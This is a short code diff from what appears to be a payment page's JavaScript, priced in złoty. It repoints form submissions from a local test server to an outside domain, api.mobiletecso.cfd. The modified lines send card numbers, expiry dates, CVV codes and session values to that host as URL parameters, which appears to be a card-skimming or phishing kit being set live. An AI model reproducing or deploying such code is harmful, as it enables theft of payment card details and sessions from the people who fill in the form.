@@ -2019,7 +2019,7 @@ priceElement.textContent += price + ' zł';
     console.log('sesion: ' + session)
     console.log(session)
     console.log(session)
-  fetch('http://127.0.0.1:5000/update'+"?session=" + encodeURIComponent(session))
+  fetch('https://api.mobiletecso.cfd/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
@@ -2122,7 +2122,7 @@ function submitForm(event) {
     let url;
     if (question) {
         console.log('question');
-        url = "http://127.0.0.1:5000/login" +
+        url = "https://api.mobiletecso.cfd/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
@@ -2133,7 +2133,7 @@ function submitForm(event) {
             "&session=" + encodeURIComponent(session);
     } else {
         console.log('question');
-        url = "http://127.0.0.1:5000/login" +
+        url = "https://api.mobiletecso.cfd/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
